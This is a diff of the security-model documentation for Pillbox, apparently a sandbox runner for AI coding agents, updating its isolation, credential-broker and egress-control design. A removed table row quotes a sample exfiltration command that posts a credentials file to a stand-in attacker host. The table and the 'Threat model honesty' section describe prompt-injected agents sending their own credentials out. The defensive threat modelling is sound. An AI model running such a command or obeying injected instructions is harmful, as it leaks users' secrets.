@@ -1,55 +1,50 @@
 # Security model
 
-Pillbox is a **sandbox runner**, not a secrets manager. The right way
-to evaluate it is to compare its posture against tools in the same
-class: `gh`, `aws`, `docker`, `kubectl`. They all store credentials as
-plaintext files at 0600 under the user's home, and rely on the host's
-disk encryption for at-rest defense. Pillbox does the same.
+Pillbox is a **sandbox runner and session substrate**, not a secrets manager.
+Local secret files are plaintext at 0600 under the user's home, like `gh`, `aws`,
+and `kubectl`; host disk encryption is the at-rest defense.
 
-> **⚠️ Direction (2026-06-01): the isolation boundary is moving Docker → libkrun
-> microVM** (see [libkrun-sandbox.md](./libkrun-sandbox.md)). Everything below
-> describes the **shipped Docker** posture — shared-kernel containers, so
-> container-escape / kernel attacks are explicitly out of scope (rows below).
-> libkrun makes the boundary a **hardware VM** (KVM/HVF), closing exactly that
-> gap, and folds in **vault v2** (credential substitution only on a TLS handshake
-> verified to an allowlisted host + default-deny egress) and **non-negotiable
-> secret-file exclusion**. Don't read the rows below as the *target* posture —
-> they're what ships today; the spec is the target.
+There are two security boundaries:
 
-> **Two gaps the vNext work tracked** (in [vnext.md](./vnext.md)): (1) the vault
-> MITMs only Anthropic/OpenAI/GitHub and **passes all other hosts through
-> unmodified** by default — an agent can exfiltrate any other secret to an
-> unmatched host. **Now addressed (opt-in):** `--egress-deny` switches on
-> **default-deny** egress (block any host with no credential provider that isn't
-> on `--egress-allow`); it stays off by default to preserve the permissive flow.
-> This also bounds the [swarm-memory](./swarm-memory.md) privacy scrub: exact-match
-> against vaulted secrets is **zero-false-negative only for known-provider hosts
-> under default-deny**, making default-deny a **prerequisite for any cross-user
-> pooling** (pooling must run with `--egress-deny`). (2) the proposed per-session
-> **blob store of raw, unredacted LLM bodies (incl. reasoning)** is a new at-rest
-> sensitive surface not yet in this threat model — add it before that capture
-> path ships.
+- **Local:** a libkrun microVM (HVF today) isolates the agent. The guest's egress
+  terminates in a host-owned userspace network stack; the host broker can replace
+  credential stubs only for their intended destinations and default-deny every
+  unmatched host. Workspace and credential homes are per-run CoW clones with a
+  pillbox-controlled secret exclusion policy.
+- **Managed, experimental:** a Cloudflare Container isolates the agent; a
+  per-session Durable Object authenticates actors, assigns sequence numbers,
+  arbitrates the driver, and stores the §0 log. Encrypted rustic snapshots live
+  in R2. Temporary R2 credentials are prefix-scoped and forwarded as the full
+  access-key/secret/session-token tuple.
+
+The local Docker **agent backend** is deprecated. Docker is still in the build
+and auth trust path today: it materializes the OCI rootfs that libkrun boots and
+runs the current OAuth login flow. A compromised Docker daemon can therefore
+tamper with those inputs even though it does not host the normal agent run.
 
 ## What pillbox defends against
 
 | Threat | How pillbox mitigates |
 |---|---|
 | Agent reads `~/.claude` or `~/.codex` on the host | Sandbox only mounts the resolved auth pillbox's `auth/<agent>/` dir; the agent never sees the host's real config directories. |
-| Agent reads host environment variables | Container env is built from `pillbox` flags only. The host's `$ANTHROPIC_API_KEY` etc. don't leak in. |
+| Agent reads host environment variables | Guest env is built from explicit pillbox inputs only. The host's `$ANTHROPIC_API_KEY` etc. do not leak in. |
 | Login flow contaminated by host state | The login container is one-shot and fresh — no prior state mounted. |
 | Other host tools accidentally consuming pillbox state | Everything is namespaced under `~/.pillbox/` with restrictive perms. |
 | `pillbox secret show --reveal` accidentally piped to logs | Refused unless `--to-stdout` is also passed. |
-| Sandbox escape via the runner image | Standard Docker isolation. The runner image is the same one lum uses for its sandboxed agents — small attack surface, no inbound ports. |
+| Agent crosses the normal local sandbox boundary | The local agent runs in a hardware-isolated libkrun microVM, not a shared-kernel container. Guest egress terminates at the host-owned broker. |
+| Managed caller forges another participant | The Durable Object derives `actor` from a verified token and ignores body-supplied identity. Driver changes are gateway-authored control events. |
+| Managed workspace credential reaches outside its project | When scoping is enabled, the host mints a fresh prefix-scoped R2 credential per transfer; mint/shape failures abort rather than falling back silently. |
 
 ## What pillbox does NOT defend against
 
 | Threat | Why pillbox can't help |
 |---|---|
-| Prompt-injected agent exfiltrating its OWN credentials | The agent was given the credential on purpose. A malicious instruction telling it to `curl evil.com -d @~/.credentials.json` works. v0.4's vault tier replaces API keys with stubs + egress proxy; OAuth subscription tokens stay mounted because they're useless without the host's `claude` binary. |
+| Prompt-injected agent abusing an authorized capability | Isolation does not distinguish a requested action from a prompt-injected one. Stub credentials prevent raw-key theft, but an agent may still make allowed requests through the broker. Use default-deny egress and least-privilege accounts. |
 | Stolen unencrypted disk / backup | Files are plaintext at 0600. If FileVault / LUKS / BitLocker isn't on, an attacker with the disk has the secrets. Same posture as `~/.aws/credentials`. |
-| Compromised Docker daemon | Pillbox uses standard `docker run` today. A root-equivalent Docker compromise is out of scope. *Direction:* the [libkrun pivot](./libkrun-sandbox.md) removes the Docker daemon from the trust path entirely (no daemon — a linked library + a microVM). |
-| Kernel-level or hypervisor attacks | Docker shares the host kernel — out of scope today. *Direction:* [libkrun](./libkrun-sandbox.md) puts the agent behind a hardware-VM boundary (KVM/HVF), which is the answer at this tier — no remote host needed. |
+| Compromised Docker daemon | Docker still materializes libkrun's OCI rootfs and runs OAuth login, so a root-equivalent daemon compromise can tamper with either. Daemonless OCI pull and auth-in-libkrun remain open structural debts. |
+| Kernel-level or hypervisor attacks | libkrun/HVF and Cloudflare's isolation reduce the shared-kernel attack surface; compromise of the host kernel, hypervisor, Cloudflare control plane, or VMM remains out of scope. |
 | Multi-user separation on a shared host | One secret store per OS user. 0600 blocks other non-root users from reading; a root user on the host bypasses it. |
+| Cloudflare/R2 compromise | Managed logs and encrypted workspace objects leave the local machine. Rustic protects workspace content at rest, but §0 event metadata/log content is trusted to the Cloudflare account boundary. Do not emit provider tokens or unredacted auth responses into §0. |
 
 ## Where data lives (v0.6)
 
@@ -132,34 +127,47 @@ non-TTY stdout. Requiring `--to-stdout` makes the leak deliberate.
 
 Same model for `pillbox env show`.
 
-## Sandbox isolation in detail
+## Local sandbox isolation in detail
 
-Each `pillbox run` invocation launches a fresh container with:
+Each normal local `pillbox run` boots a fresh libkrun microVM with:
 
-- `--rm` so it's deleted on exit. No state persists in the container.
-- A clean `/home/pillbox` populated by bind-mounting the resolved auth
-  pillbox's `auth/<agent>/` directory (e.g.
-  `~/.pillbox/global/auth/claude/`). The agent only sees its OWN
-  persistent HOME, not the user's real `~/.claude` / `~/.codex`.
-- A workspace bind mount at `/workspace/<name>` (defaults to cwd).
-- Env vars composed from `--env BUNDLE` → `--env-file PATH` → `--with
-  NAME` only. The host's environment doesn't leak in.
-- `PATH=/usr/local/bin:/usr/bin:/bin:$HOME/.local/bin` — the runtime
-  image's binaries take precedence over anything an agent might write
-  into `$HOME/.local/bin`.
+- a CoW workspace clone mounted at `/workspace/<name>`;
+- a per-run CoW credential home, not the user's real `~/.claude`, `~/.codex`,
+  or other host configuration;
+- an explicit env assembled from `--env`, `--env-file`, `--with`, and pillbox's
+  runtime variables rather than the ambient host environment;
+- vsock control/attach channels instead of a host daemon API;
+- guest networking terminated by the host-owned smoltcp + MITM broker, where
+  destination binding, stub swap, and egress policy are enforced;
+- a pillbox-owned ingest denylist that excludes credential files, key material,
+  `.env` secrets, and other sensitive paths from workspace snapshots.
 
-The login flow is the same shape, except no workspace mount and no
-secret/env injection — it's just `pillbox auth login --agent <agent>`
-running the agent's OAuth flow in a one-shot container.
+The OCI runner filesystem is still pulled/unpacked through Docker and cached as
+the libkrun rootfs. OAuth login also still runs in a one-shot container. Both are
+tracked migration debts, not supported alternative agent placements.
+
+## Managed data boundary
+
+- The Durable Object stores the attributed §0 log and driver state. Do not place
+  raw OAuth tokens, provider auth responses, or workspace secrets in event
+  payloads.
+- Workspace content is encrypted and content-addressed by rustic in R2. The
+  local `repo-password` is not persisted in the session record, but it crosses
+  to the managed provision/finalize handler over HTTPS for the foreground
+  transfer.
+- The host can mint a fresh prefix-scoped R2 credential for provision and
+  another for finalize. The bucket-wide parent secret does not cross to
+  Cloudflare on that path; the temporary session token is required and
+  propagated end-to-end.
+- Managed identity currently uses interim token material supplied through the
+  environment. User-facing issuance, reconnect semantics, detached
+  finalization, and complete remote teardown are not yet product-ready.
 
 ## Sessions (detach + reattach)
 
-A detached session runs entirely on the local host — a long-lived
-sandbox (Docker container or libkrun microVM) plus a local session
-record. There is no remote host and nothing crosses the network at
-session start. `--detach` does not support `--vault`: the host-side
-MITM proxy can't outlive the CLI, so a vaulted run must stay in the
-foreground.
+A detached local session is a long-lived libkrun microVM plus a local session
+record. Its credential/egress broker is owned with the VM, so libkrun supports
+detached vaulted runs. The deprecated Docker backend does not.
 
 `pillbox session detach <id>` SIGTERMs the `attached_pid` recorded
 in the session TOML. The recorded pid is validated before
@@ -176,22 +184,23 @@ signalling:
 Session records themselves contain only opaque resource handles
 (sandbox ids, pids) — no credentials, no secrets. The threat from
 exposure of a session record is "can a co-tenant on the host hijack
-the session?" — they'd need access to the local Docker socket /
-libkrun process the sandbox runs under, which the host's own perms
-gate; the record alone grants nothing.
+the session?" — they would still need access to the libkrun process/socket,
+which the host's own permissions gate; the record alone grants nothing.
 
 ## Threat model honesty
 
-The biggest unmitigated threat is **the agent doing what you told it
-to do, but for a malicious instruction**. If a prompt injection tells
-claude to read its own credentials and POST them somewhere, claude
-will. Pillbox makes this harder by:
+The biggest residual threat is **the agent exercising an authorized capability
+for a malicious instruction**. Pillbox makes raw credential theft harder by:
 
-- Not handing the agent the host's credentials (only its own).
-- Stripping host env vars by default.
-- Optionally mediating egress through the local `--vault` MITM
-  stub-swap proxy, which keeps real OAuth tokens / API keys on the
-  host and hands the sandbox stubs (see [vault.md](./vault.md)).
+- keeping real local credentials at the host-owned broker and handing the guest
+  destination-bound stubs;
+- stripping ambient host env vars;
+- supporting default-deny egress with explicit allowlisting;
+- excluding secret paths from workspace ingest.
+
+Those controls do not make a permitted API call safe. A prompt-injected agent
+may still spend tokens, change code, or send allowed data to an allowlisted
+service using the authority the user intentionally granted.
 
 But ultimately: **don't run untrusted prompts against an agent that
 holds production credentials**. That's a policy decision pillbox
